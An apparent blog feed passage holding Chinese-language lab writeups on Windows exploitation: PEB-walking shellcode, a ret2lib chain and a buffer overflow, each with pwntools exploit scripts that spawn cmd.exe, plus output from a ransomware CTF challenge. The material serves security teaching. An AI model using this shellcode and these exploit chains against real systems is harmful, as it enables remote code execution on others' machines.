                                                                                       ─╯</span><br><span class="line">[+] Fake Machine ID: 43e88d41-67fe-4af4-95af-11a0ff5731e2</span><br><span class="line">[+] Generated Encryption Key: xs0zV0FG4V3f8NBwdO/k2GjiMEg6ptqJ46aSf2rbaEM=</span><br><span class="line">/Users/kingkazma/anaconda3/lib/python3.10/site-packages/urllib3/connectionpool.py:1064: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;rans.kazma.tw&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">[+] Successfully submitted machine ID and key to the server!</span><br><span class="line">/Users/kingkazma/anaconda3/lib/python3.10/site-packages/urllib3/connectionpool.py:1064: InsecureRequestWarning: Unverified HTTPS request is being made to host <span class="string">&#x27;rans.kazma.tw&#x27;</span>. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/1.26.x/advanced-usage.html<span class="comment">#ssl-warnings</span></span><br><span class="line">  warnings.warn(</span><br><span class="line">[+] Successfully retrieved the flag: CGGC&#123;Nn3lr*WppJ%RkdTsGRAR&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這次出了一題勒索軟體當作 CGGC 2024 決賽的 reverse medium，開發上其實花了不少時間，因為一直</summary>
      
    
    
    
    
    <category term="cggc" scheme="https://kazma.tw/tags/cggc/"/>
    
    <category term="medium" scheme="https://kazma.tw/tags/medium/"/>
    
    <category term="reverse" scheme="https://kazma.tw/tags/reverse/"/>
    
    <category term="ransomware" scheme="https://kazma.tw/tags/ransomware/"/>
    
  </entry>
  
  <entry>
    <title>AngelBoy Windows Binary Exploitation play_with_win_sc Writeup</title>
    <link href="https://kazma.tw/2024/11/19/AngelBoy-Windows-Binary-Exploitation-shellcoding-Writeup/"/>
    <id>https://kazma.tw/2024/11/19/AngelBoy-Windows-Binary-Exploitation-shellcoding-Writeup/</id>
    <published>2024-11-19T05:39:07.098Z</published>
    <updated>2024-11-20T07:39:35.367Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這邊要練習的是 windows 的 shellcoding，因為 windows 的 system call number 會改變，所以我們會直接 call API，跟 Linux 上有很大的區別。<br>我們在做 Windows Shellcoding 時有最重要的三件事：</p><ol><li>Find dll address</li><li>Find function address</li><li>Call function</li></ol><p>那在 windows 中有幾個很重要的資料結構分別是：</p><ul><li>_TEB (Thread Environment Block)<ul><li>每個 thread 都會有一個</li><li>主要存放每個 Thread 中執行時的資訊<ul><li>_NT_TIB<ul><li>Stack Base 位置</li></ul></li><li>PEB 位置</li></ul></li><li>恆有一個 segment register 指向該結構<ul><li>32 bit:FS</li><li>64 bit:GS</li></ul></li><li>windbg 相關指令<ul><li><code>!teb</code></li><li><code>dt ntdll!_TEB [teb address]</code></li><li><code>dt ntdll!_NT_TIB [tib address]</code></li></ul></li></ul></li><li>_PEB (Process Environment Block)<ul><li>記錄 Process 相關的資訊<ul><li>Load module (_PEB_LDR_DATA)<ul><li>Linked list 結構，記錄所有有 load 進 memory 的 dll 資訊</li></ul></li><li>ProcessHeap</li><li>ImageBase<ul><li>Binary Base</li></ul></li></ul></li></ul></li><li>Ldr (_PEB_LDR_DATA)<ul><li>由以下三個 Linked list 串接所有載入 dll 的資訊，不同的地方是順序<ul><li>InLoadOrderModuleList</li><li>InMemoryOrderModuleList</li><li>InInitializationOrderModuleList</li></ul></li><li>windbg 相關指令<ul><li><code>dt ntdll!_PEB_LDR_DATA</code></li></ul></li></ul></li></ul><p>總結從 _TEB 到 Kernel32 的位置關係圖：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/shellcoding_note.png"                      alt="note"                ></p><p>那根據這個結構，我們可以利用 GS 暫存器來獲得所有 dll 的位置，假設我們的目標是 kernel32.dll 的 WinExec，我們首先就必須獲得 PEB 的位置：</p><ul><li>64 bit：gs:[0x60]</li><li>32 bit：fs:[0x30]<br>接著從 PEB 獲取 PebLdr 再獲取其中的 InMemoryOrderModuleList，其中我們的目標在第三層：</li><li>第一層為 binary</li><li>第二層為 ntdll</li><li>第三層為 kernel32</li></ul><p>拿到 kernel32 base 之後我們接著要來做第二步拿 function address，那這邊就牽涉到一些重要觀念，首先是 RVA：</p><ul><li>RVA (Relative Virtual Address)<ul><li>記憶體中，相對於 Bianry Base 之間的 offset </li><li>假設 RVA &#x3D; 0x3000，那在記憶體中的位置就是 binary base + 0x3000<br>以及我們需要先獲得下列幾項在記憶體中的實際位置：</li></ul></li><li>Export Directory Table<ul><li>dll 要導出函式給其他 program 所使用的結構</li><li>可以從 PE 結構中找出 Export Directory 的 RVA</li></ul></li><li>Address Table</li><li>Name Pointer Table</li><li>Ordinal Table<br>我們可以透過先前獲得的 DLL base 及 PE format 來獲得該 DLL 的 Export Directory table</li><li>Find NT Header RVA</li><li>Find DataDirectory[0]</li><li>Get Export Directory table RVA<br>參考結構如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/datadirectory.png"                      alt="datadirectory"                ><br>那怎麼用 Export Directory table 找到 function address</li><li>找出 Name Pointer Table</li><li>一一比對字串直到找到 WinExec，此時記下 index</li><li>找出 Ordinal Table</li><li>利用剛剛的 index 獲得對應該 index 的 ordinal number </li><li>接著找出 Export address table</li><li>利用剛剛獲得的 ordinal number 取得 Export address table 中對應的內容，該內容即為 WinExec 的 RVA</li><li>最後 DLL BASE + RVA 就會獲得 WinExec 的位置<br>最後一部就是正常的呼叫 function 即可，注意以下幾點：</li><li>參數順序為 rcx, rdx, r8, r9</li><li>呼叫 WinExec 時必須對齊 0x10 (因為 WinExec 有 xmm 指令)<br>Angelboy 補充找字串時，正常來說會以 Hash 的方式來比對會準確一點且方便一點，因為這邊是在教學所以單純做字串比對。</li></ul><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>參考解答：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;192.168.0.108&quot;</span>, <span class="number">56003</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">r.newline = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Goal -&gt; kernel32!WinExec(cmd)</span></span><br><span class="line"></span><br><span class="line">sc = asm(</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rdi,rdi</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    xor rcx,rcx</span></span><br><span class="line"><span class="string">    xor r8,r8</span></span><br><span class="line"><span class="string">    xor r9,r9</span></span><br><span class="line"><span class="string">    xor r11,r11</span></span><br><span class="line"><span class="string">    xor r12,r12</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi,qword ptr gs:[0x60]  # peb</span></span><br><span class="line"><span class="string">    mov rdi,qword ptr [rdi+0x18] # ldr</span></span><br><span class="line"><span class="string">    mov rdi,qword ptr [rdi+0x20] # imoml - binary</span></span><br><span class="line"><span class="string">    mov rdi,qword ptr [rdi] # ntdll</span></span><br><span class="line"><span class="string">    mov rdi,qword ptr [rdi] # kernel32</span></span><br><span class="line"><span class="string">    mov rdi,qword ptr [rdi+0x20] # kernel32 base addr</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov esi,dword ptr [rdi+0x3c] # rva nt header</span></span><br><span class="line"><span class="string">    lea rsi,qword ptr [rdi+rsi] # nt header</span></span><br><span class="line"><span class="string">    mov edx,dword ptr [rdi+4+0x14+0x70] # rva export directory</span></span><br><span class="line"><span class="string">    lea rsi,qword ptr [rdi+rdx] # export directory</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    xor rcx,rcx # index</span></span><br><span class="line"><span class="string">    mov r12,0x%1x</span></span><br><span class="line"><span class="string">    mov edx,dword ptr [rsi+0x18] # number of name (rdx)</span></span><br><span class="line"><span class="string">    mov r8d,dword ptr [rsi+0x20] # rva of nanm pointer table</span></span><br><span class="line"><span class="string">    lea r8,qword ptr [rdi+r8] # name pointer table</span></span><br><span class="line"><span class="string">search:</span></span><br><span class="line"><span class="string">    mov r9d,dword ptr [r8+rcx*4] # function name rva</span></span><br><span class="line"><span class="string">    mov r9,qword ptr [rdi+r9] # function name</span></span><br><span class="line"><span class="string">    cmp r12,r9</span></span><br><span class="line"><span class="string">    je found</span></span><br><span class="line"><span class="string">    cmp rdx,rcx</span></span><br><span class="line"><span class="string">    je notfound</span></span><br><span class="line"><span class="string">    inc rcx</span></span><br><span class="line"><span class="string">    jmp search</span></span><br><span class="line"><span class="string">found:</span></span><br><span class="line"><span class="string">    xor r8,r8</span></span><br><span class="line"><span class="string">    xor r9,r9</span></span><br><span class="line"><span class="string">    mov r8d,dword ptr [rsi+0x24] # rva of ordinal table</span></span><br><span class="line"><span class="string">    lea r8,qword ptr [rdi+r8] # ordinal table</span></span><br><span class="line"><span class="string">    mov r9w,word ptr [r8+rcx*2] # ordinal</span></span><br><span class="line"><span class="string">    xor r8,r8</span></span><br><span class="line"><span class="string">    mov r8d,dword ptr [rsi+0x1c] # rva of export address table</span></span><br><span class="line"><span class="string">    lea r8,qword ptr [rdi+r8] # export address table</span></span><br><span class="line"><span class="string">    mov r9d,dword ptr [r8+r9*4] # rva of WinExec</span></span><br><span class="line"><span class="string">    lea r9,qword ptr [rdi+r9] # WinExec</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    jmp cmd</span></span><br><span class="line"><span class="string">go:</span></span><br><span class="line"><span class="string">    pop rcx # cmd.exe</span></span><br><span class="line"><span class="string">    sub rsp,0x100</span></span><br><span class="line"><span class="string">    and rsp,0xfffffffffffffff0</span></span><br><span class="line"><span class="string">    call r9</span></span><br><span class="line"><span class="string">notfound:</span></span><br><span class="line"><span class="string">    int3</span></span><br><span class="line"><span class="string">cmd:</span></span><br><span class="line"><span class="string">    call go</span></span><br><span class="line"><span class="string">    .ascii &quot;cmd.exe&quot;</span></span><br><span class="line"><span class="string">    .byte 0</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    % u64(<span class="string">b&quot;WinExec\x00&quot;</span>)</span><br><span class="line">)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(sc)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>然後不確定是我的 lab 有問題還是 exploit 有問題，目前沒辦法正常 work，等之後有空來 debug 一下，或是知道為什麼的可以跟我說哈哈，這邊的重點是大家要知道整個 shellcode 撰寫的流程以及 windows 中那些資料結構的關係和個部分的 offset，這樣就不會被複雜的 shellcode 嚇到了，祝各位 Happy Hacking。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Intro&quot;&gt;&lt;a href=&quot;#Intro&quot; class=&quot;headerlink&quot; title=&quot;Intro&quot;&gt;&lt;/a&gt;Intro&lt;/h2&gt;&lt;p&gt;這邊要練習的是 windows 的 shellcoding，因為 windows 的 system call num</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="note" scheme="https://kazma.tw/tags/note/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
    <category term="shellcoding" scheme="https://kazma.tw/tags/shellcoding/"/>
    
  </entry>
  
  <entry>
    <title>AngelBoy Windows Binary Exploitation ret2lib Writeup</title>
    <link href="https://kazma.tw/2024/11/19/AngelBoy-Windows-Binary-Exploitation-ret2lib-Writeup/"/>
    <id>https://kazma.tw/2024/11/19/AngelBoy-Windows-Binary-Exploitation-ret2lib-Writeup/</id>
    <published>2024-11-18T16:29:07.436Z</published>
    <updated>2024-11-18T17:45:56.369Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>這題要練習的事 windows 的 ret2lib，首先看一下 source code:</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//g++ -g -o ret2lib.exe ret2lib.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">See_something</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>* address;</span><br><span class="line">    address = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>*)addr;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>, *address);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> name[<span class="number">20</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getname</span><span class="params">(<span class="type">char</span>* username)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strdup</span>(name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Main:%p\n&quot;</span>, &amp;main);</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span> address[<span class="number">20</span>];</span><br><span class="line">    <span class="type">char</span> message[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, name, <span class="number">20</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in hex) :&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, address, <span class="number">20</span>);</span><br><span class="line">    addr = <span class="built_in">strtoll</span>(address, <span class="number">0</span>, <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">See_something</span>(addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, message, <span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, message);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thanks you&quot;</span>);</span><br><span class="line">    <span class="built_in">getname</span>(name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>首先一開始一樣會先印出 main 的位置，我們可以透過 windbg 將 main 的位置減掉 binary base 得到 offset，之後就可以透過一開始印出的 main 減掉 offset 來得到 binary base 了，如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/ret2lib_main.png"                      alt="main"                ><br>這邊得到 offset 是 0x1485<br>IAT 的 offset 可以透過把我們的 exe 丟進去 PE-bear 中的 Optional Header 的最底下會看到：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/ret2lib_pebear.png"                      alt="bear"                ><br>IAT 的 offset 在這邊可以看到是 0x8268，拿到 IAT 的 offset 後，我們就可以在 windbg 看一下 IAT 上面有什麼，我們用 dqs 來搭配 symbol 解讀 function name：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/dqs.png"                      alt="dqs"                ><br>我們這邊隨便挑一個順眼的來用例如說 GetLastErrorStub 這邊是 IAT + 0x10，然後我們接著打開 DLL Export Viewer 來看他的 offset 是多少，結果做到這邊之後我發現我 dqs 出來之後的好像都是跳板函數居多，沒辦法在 DLL Export Viewer 裡面搜尋到，於是查了資料後發現可以用 <code>lm vm kernel32</code> 的指令看到 kernel32 當前的 base 然後我們就可以減出 offset 了，操作如下：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/lm_vm_kernel32.png"                      alt="lm"                ><br>到這邊也可以在 exploit 先把 kernel32 的 base 印出來檢查對不對。<br>接著我們就可以透過 DLL Explort Viewer 去查 WinExec 的 offset 了，不過這邊要提醒的一點是跟剛剛一樣我們需要注意對齊的問題，因為如果這邊直接去執行，會發現程式死在 xmmword 的地方，這時我們可以補一個 ret gadget 來補齊這個 8 bytes。<br>最後我們會發現 WinExec 的參數還沒有設定，如果我們去執行後就會發現 WinExec 的參數 rcx 會是我們剛剛的 name，因為程式最後用 <code>getname</code> 把參數設定成 name 了，所以我們這邊就在 name 填上 <code>cmd.exe\00</code> 就行了。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;192.168.0.108&quot;</span>, <span class="number">56002</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r.newline = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">main = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">binbase = main - <span class="number">0x1485</span></span><br><span class="line"><span class="comment"># print(hex(binbase))</span></span><br><span class="line">iat = binbase + <span class="number">0x8268</span></span><br><span class="line">GetLastErrorStub_iat = iat + <span class="number">0x10</span></span><br><span class="line">name = <span class="string">b&quot;cmd.exe\00&quot;</span></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(name)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">hex</span>(GetLastErrorStub_iat))</span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line">GetLastErrorStub = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&quot;\n&quot;</span>), <span class="number">16</span>)</span><br><span class="line">kernel32 = GetLastErrorStub - <span class="number">0x10E10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;kernel32: &quot;</span>, <span class="built_in">hex</span>(kernel32))</span><br><span class="line"></span><br><span class="line">winexec = kernel32 + <span class="number">0x68AD0</span></span><br><span class="line">ret = binbase + <span class="number">0x1600</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:&quot;</span>)</span><br><span class="line"><span class="comment"># p = cyclic(0x400)</span></span><br><span class="line">p = <span class="string">b&quot;a&quot;</span> * <span class="number">296</span> + p64(ret) + p64(winexec)</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">r.sendline(p)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p>執行結果：<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/ret2lib_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;這題要練習的事 windows 的 ret2lib，首先看一</summary>
      
    
    
    
    
    <category term="pwn" scheme="https://kazma.tw/tags/pwn/"/>
    
    <category term="windows" scheme="https://kazma.tw/tags/windows/"/>
    
    <category term="ret2lib" scheme="https://kazma.tw/tags/ret2lib/"/>
    
  </entry>
  
  <entry>
    <title>AngelBoy Windows Binary Exploitation bofeasy Writeup</title>
    <link href="https://kazma.tw/2024/11/18/AngelBoy-Windows-Binary-Exploitation-bofeasy-Writeup/"/>
    <id>https://kazma.tw/2024/11/18/AngelBoy-Windows-Binary-Exploitation-bofeasy-Writeup/</id>
    <published>2024-11-18T13:01:38.464Z</published>
    <updated>2024-11-18T17:47:35.110Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h2><p>這題是要練習 windows 的 bof，結果意外的因為沒有提供 lab 又練習到 AppJailLauncher.exe 的使用 XD</p><h2 id="Exploitaion"><a href="#Exploitaion" class="headerlink" title="Exploitaion"></a>Exploitaion</h2><p>我們先看這題的程式碼：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//g++ -g -o bofeasy.exe bofeasy.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">l33t</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congrat !&quot;</span>);</span><br><span class="line">    <span class="built_in">WinExec</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>((<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">time</span>(<span class="literal">NULL</span>));</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">rand</span>() &amp; <span class="number">0xffff</span>) == <span class="number">0xddaa</span>) &#123;</span><br><span class="line">        <span class="built_in">l33t</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x30</span>];</span><br><span class="line">    <span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main: %p\n&quot;</span>, &amp;main);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Input: &quot;</span>);</span><br><span class="line">    _read(<span class="number">0</span>, buf, <span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>我們可以看到這題就是簡單的 bof，並且還會輸出 main 的地址讓我們可以透過 offset 得到穩定的 l33t 地址。<br>那首先要注意的是 windows 的換行是 “\r\n”，所以我們需要先調整 pwntools 的換行符號，否則輸出會不如預期，再來是我們一樣可以透過 cyclic 來協助我們找到 rip 的 offset，接著就跟 linux 差不多啦。<br>值得一題的是因為這邊會有對齊的問題，所以我們可以跳過 function prologue 來讓程式補回 X8 bytes 來對齊。</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;192.168.0.108&quot;</span>, <span class="number">56001</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">r.newline = <span class="string">b&quot;\r\n&quot;</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;main: &quot;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="built_in">int</span>(r.recvuntil(<span 